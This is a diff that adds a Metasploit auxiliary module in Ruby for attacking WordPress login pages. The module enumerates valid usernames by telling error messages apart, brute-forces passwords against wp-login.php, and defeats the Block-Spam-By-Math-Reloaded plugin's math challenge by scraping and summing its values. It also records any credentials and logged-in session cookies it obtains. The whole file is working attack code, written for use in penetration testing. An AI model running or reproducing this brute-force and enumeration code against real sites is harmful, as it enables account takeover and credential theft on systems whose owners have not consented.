@@ -1,0 +1,220 @@
+##
+# $Id: wordpress_login_enum.rb 12196 2011-04-01 00:51:33Z egypt $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::AuthBrute
+	include Msf::Auxiliary::Report
+	include Msf::Auxiliary::Scanner
+
+
+	def initialize
+		super(
+			'Name'           => 'Wordpress Brute Force and User Enumeration Utility',
+			'Version'        => '$Revision: 12196 $',
+			'Description'    => 'Wordpress Authentication Brute Force and User Enumeration Utility',
+			'Author'         => [
+				'Alligator Security Team',
+				'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+        'Heyder Andrade <heyder[at]alligatorteam.org>' # Block-Spam-By-Math-Reloaded Bypass
+		],
+			'References'     =>
+				[
+					['BID', '35581'],
+					['CVE', '2009-2335'],
+					['OSVDB', '55713'],
+				],
+			'License'        =>  MSF_LICENSE
+		)
+
+		register_options(
+			[ Opt::RPORT(80),
+				OptString.new('URI', [false, 'Define the path to the wp-login.php file', '/wp-login.php']),
+				OptBool.new('VALIDATE_USERS', [ true, "Enumerate usernames", true ]),
+				OptBool.new('BSBM_BYPASS', [ true, "Block-Spam-By-Math-Reloaded Bypass ", false]),
+				OptBool.new('BRUTEFORCE', [ true, "Perform brute force authentication", true ]),
+		], self.class)
+
+	end
+
+	def target_url
+		"http://#{vhost}:#{rport}#{datastore['URI']}"
+	end
+
+
+	def run_host(ip)
+		if datastore['VALIDATE_USERS']
+			@users_found = {}
+			vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
+			each_user_pass { |user, pass|
+				do_enum(user)
+			}
+
+			unless (@users_found.empty?)
+				print_good("#{target_url} - WordPress Enumeration - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
+			end
+		end
+
+		if datastore['BRUTEFORCE']
+			vprint_status("#{target_url} - WordPress Brute Force - Running Bruteforce")
+			if datastore['VALIDATE_USERS']
+				if @users_found && @users_found.keys.size > 0
+					vprint_status("#{target_url} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
+				else
+					vprint_status("#{target_url} - WordPress Brute Force - No valid users found. Exiting.")
+					return
+				end
+			end
+			each_user_pass { |user, pass|
+				if datastore['VALIDATE_USERS']
+					next unless @users_found[user]
+				end
+					do_login(user, pass)
+			}
+		end
+	end
+
+	def do_enum(user=nil)
+		post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=x&wp-submit=Login"
+		print_status("#{target_url} - WordPress Enumeration - Checking Username:'#{user}'")
+
+		begin
+
+			res = send_request_cgi({
+				'method'  => 'POST',
+				'uri'     => datastore['URI'],
+				'data'    => post_data,
+			}, 20)
+
+
+			valid_user = false
+
+			if (res and res.code == 200 )
+				if (res.body.to_s =~ /Incorrect password/ )
+					valid_user = true
+
+				elsif (res.body.to_s =~ /document\.getElementById\(\'user_pass\'\)/ )
+					valid_user = true
+
+				else
+					valid_user = false
+
+				end
+
+			else
+				print_error("#{target_url} - WordPress Enumeration - Enumeration is not possible. #{res.code} response")
+				return :abort
+
+			end
+
+			if valid_user
+				print_good("#{target_url} - WordPress Enumeration- Username: '#{user}' - is VALID")
+				report_auth_info(
+					:host => rhost,
+					:sname => 'http',
+					:user => user,
+					:port => rport,
+					:proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
+				)
+
+				@users_found[user] = :reported
+				return :next_user
+			else
+				vprint_error("#{target_url} - WordPress Enumeration - Invalid Username: '#{user}'")
+				return :skip_user
+			end
+
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+		rescue ::Timeout::Error, ::Errno::EPIPE
+		end
+	end
+
+  def smartaleck(values)
+    answer = 0 
+    values.each { |a| answer+=a.to_i }
+    return answer
+  end
+
+  def getvalues(response)
+    i = 0 
+    values = []
+    while (i <= 1) do
+        response.body.match(%r{.?(mathvalue#{i}).*(value=).([\d]+)})
+        values[i] = $3
+        i += 1
+    end 
+    return values
+  end
+
+  def baserequest()
+    begin
+    res = send_request_cgi({
+        'method'  => 'GET',
+        'uri'     => datastore['URI'],
+      }, 20) 
+    return res
+    end
+  end
+
+
+	def do_login(user=nil,pass=nil)
+    if (datastore['BSBM_BYPASS'])
+      v = getvalues(baserequest())
+      sec_answer = smartaleck(v)
+		  post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=#{Rex::Text.uri_encode(pass.to_s)}&mathvalue2=#{sec_answer}&mathvalue0=#{v[0]}&mathvalue1=#{v[1]}&&wp-submit=Login"
+    else
+		  post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=#{Rex::Text.uri_encode(pass.to_s)}&wp-submit=Login"
+		  vprint_status("#{target_url} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")
+    end
+
+		begin
+
+			res = send_request_cgi({
+				'method'  => 'POST',
+				'uri'     => datastore['URI'],
+				'data'    => post_data,
+			}, 20)
+
+			if (res and res.code == 302 )
+				if res.headers['Set-Cookie'].match(/wordpress_logged_in_(.*);/i)
+					print_good("#{target_url} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
+					report_auth_info(
+						:host => rhost,
+						:port => rport,
+						:sname => 'http',
+						:user => user,
+						:pass => pass,
+						:proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}, COOKIE=#{res.headers['Set-Cookie']}",
+						:active => true
+					)
+
+					return :next_user
+				end
+
+				print_error("#{target_url} - WordPress Brute Force - Unrecognized 302 response")
+				return :abort
+
+			elsif res.body.to_s =~ /login_error/
+				vprint_error("#{target_url} - WordPress Brute Force - Failed to login as '#{user}'")
+				return
+			else
+				print_error("#{target_url} - WordPress Brute Force - Unrecognized #{res.code} response") if res
+				return :abort
+			end
+
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+		rescue ::Timeout::Error, ::Errno::EPIPE
+		end
+	end
+end
+
